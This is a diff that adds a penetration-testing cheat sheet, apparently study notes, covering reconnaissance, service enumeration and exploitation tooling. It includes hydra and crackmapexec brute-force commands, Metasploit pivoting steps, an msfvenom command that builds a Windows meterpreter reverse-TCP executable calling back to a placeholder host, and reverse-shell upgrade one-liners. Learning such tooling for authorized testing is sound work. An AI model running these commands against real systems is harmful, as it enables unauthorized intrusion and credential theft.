@@ -1,0 +1,86 @@
+1. Assessment Methodologies
+1.1 Information Gathering – Passive
+Tool / Command	Usage	Result
+host {CMD}	DNS lookup	IPv4 + IPv6 + Mail Server
+{URL}/robots.txt	Check disallowed paths	Unindexed folders/files
+{URL}/sitemap.xml	Discover site structure	Website mapping
+Wappalyzer (Browser Add-on)	Detect technologies	Technology stack
+whatweb {CMD}	Detect technologies	Technology stack
+httrack {CMD}	Clone website	Website source analysis
+whois {CMD}	WHOIS lookup	Domain registration info
+netcraft.com	Web tech + hosting info	Site report
+dnsdumpster.com	DNS records visual map	DNS records
+sublist3r {CMD}	Subdomain enumeration	Subdomain list
+Google Dorks / GHDB	Search engine OSINT	Accidental leaks
+theHarvester {CMD}	Harvest emails/domains	Email list
+haveibeenpwned	Email breach check	Email leak DB
+
+1.2 Information Gathering – Active
+Tool / Command	Purpose	Result
+wafw00f {CMD}	Detect WAF	WAF fingerprinting
+dnsenum {CMD}	DNS brute force	DNS zone transfer
+dnsrecon {CMD}	DNS recon	DNS records
+nmap {CMD}	Port/service scan	Network mapping
+netdiscover {CMD}	ARP scan	ARP host discovery
+ping / fping	ICMP scan	ICMP host discovery
+arp-scan {CMD}	ARP discovery	ARP host discovery
+route -n	Routing table	Network layout
+
+2. Enumeration & Footprinting
+2.1 Enumeration Checklist by Service
+Service	Port	Enumeration Steps	Tools
+FTP	21	Version, auth brute-force, anonymous login	nmap, msf ftp_login
+SMB	445	Version, users, shares, brute-force	nmap, smbclient, enum4linux
+HTTP	80/443	Headers, dirs, robots.txt, brute-force	nmap, dirb, msf http_login
+MySQL	3306	Version, schema dump, hash dump	mysql, msf mysql_login
+SSH	22	Version, user enum, brute-force	nmap, msf ssh_login
+SMTP	25	VRFY/EXPN, user enum	netcat, msf
+RDP	3389	Service check, brute-force	Hydra, msf rdp_scanner
+
+3. Exploitation & Vulnerability Assessment
+3.1 Windows Targets
+Service	Port	Purpose	Tool	Example Command
+IIS	80/443	Web server	searchsploit	searchsploit iis
+WebDAV	80/443	File server over HTTP	davtest, cadaver	davtest -url http://target/
+SMB	445	File sharing	crackmapexec	crackmapexec smb target -u user -p pass
+RDP	3389	Remote GUI	xfreerdp	xfreerdp /u:user /p:pass /v:ip
+WinRM	5985/5986	Remote management	evil-winrm	evil-winrm -u user -p pass -i ip
+NetBIOS	137-139	Hostname/Share enum	nbtscan	nbtscan ip
+SNMP	161	Network device info	snmpwalk	snmpwalk -v2c -c public ip
+
+3.2 Linux Targets
+Service	Port	Purpose	Tool	Example
+Apache	80/443	Web server	nmap --script vuln	nmap --script vuln -p80 target
+SSH	22	Remote shell	hydra, msf ssh_login	hydra -l root -P pass.txt ssh://ip
+FTP	21	File transfer	nmap --script ftp-anon	nmap -p21 --script ftp-anon ip
+Samba	445	File sharing	smbclient	smbclient //ip/share
+
+4. Useful Metasploit Tips
+bash
+Copy
+Edit
+# Start MSF DB
+service postgresql start
+db_status
+
+# Import Nmap scan
+db_import scan.xml
+
+# Run Nmap from MSF
+db_nmap -sV target
+
+# Pivoting
+run autoroute -s SUBNET
+use auxiliary/server/socks_proxy
+5. Payload Generation
+bash
+Copy
+Edit
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
+6. Reverse Shell Upgrade
+bash
+Copy
+Edit
+python -c 'import pty; pty.spawn("/bin/bash")'
+perl -e 'exec "/bin/bash";'
+ruby -e 'exec "/bin/bash"'
